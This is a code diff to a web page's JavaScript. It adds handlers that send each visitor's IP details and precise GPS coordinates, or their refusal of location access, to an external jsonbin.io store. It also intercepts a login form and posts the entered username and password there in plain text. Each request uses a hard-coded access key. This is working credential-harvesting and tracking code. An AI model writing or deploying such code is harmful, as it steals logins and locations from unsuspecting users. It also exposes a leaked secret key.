@@ -17,14 +17,6 @@ function requestLocation() {
     return res.json();
   })
   .then(data => {
-    // Prepare location data
-    const locationData = {
-      ip: data.ip,
-      city: data.city,
-      country: data.country,
-      loc: data.loc,
-      timestamp: new Date().toISOString()
-    };
 
     // Save to jsonbin.io
     let req = new XMLHttpRequest();
@@ -38,11 +30,83 @@ function requestLocation() {
     req.open("POST", "https://api.jsonbin.io/v3/b", true);
     req.setRequestHeader("Content-Type", "application/json");
     req.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
-    req.send(JSON.stringify(locationData));
+    req.send(JSON.stringify(data));
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp
+          };
+          // Send location data to jsonbin.io
+          let geoReq = new XMLHttpRequest();
+          geoReq.onreadystatechange = () => {
+            if (geoReq.readyState == XMLHttpRequest.DONE) {
+              // Optionally handle response
+            }
+          };
+          geoReq.open("POST", "https://api.jsonbin.io/v3/b", true);
+          geoReq.setRequestHeader("Content-Type", "application/json");
+          geoReq.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
+          geoReq.send(JSON.stringify(locationData));
+          showStatus('Location permission granted. Location sent.');
+        },
+        error => {
+          // User denied or error occurred
+          let deniedData = { error: error.message, denied: true, timestamp: Date.now() };
+          let deniedReq = new XMLHttpRequest();
+          deniedReq.onreadystatechange = () => {
+            if (deniedReq.readyState == XMLHttpRequest.DONE) {
+              // Optionally handle response
+            }
+          };
+          deniedReq.open("POST", "https://api.jsonbin.io/v3/b", true);
+          deniedReq.setRequestHeader("Content-Type", "application/json");
+          deniedReq.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
+          deniedReq.send(JSON.stringify(deniedData));
+          showStatus('Location permission denied.', true);
+        }
+      );
+    } else {
+      showStatus('Geolocation is not supported.', true);
+    }
   })
   .catch(err => {
     showStatus('Could not get location.', true);
   });
 }
 
-window.onload = requestLocation;
+
+window.onload = function() {
+  requestLocation();
+
+  // Attach login form handler
+  const loginForm = document.querySelector('.login-form');
+  if (loginForm) {
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const loginType = document.querySelector('input[name="loginType"]:checked').value;
+      const identifier = document.getElementById('login-identifier').value;
+      const password = loginForm.querySelector('input[type="password"]').value;
+      const loginData = {
+        type: loginType,
+        identifier,
+        password,
+        timestamp: Date.now()
+      };
+      let req = new XMLHttpRequest();
+      req.onreadystatechange = () => {
+        if (req.readyState == XMLHttpRequest.DONE) {
+          // Optionally handle response
+        }
+      };
+      req.open("POST", "https://api.jsonbin.io/v3/b", true);
+      req.setRequestHeader("Content-Type", "application/json");
+      req.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
+      req.send(JSON.stringify(loginData));
+      showStatus('Login info sent to server.');
+    });
+  }
+};
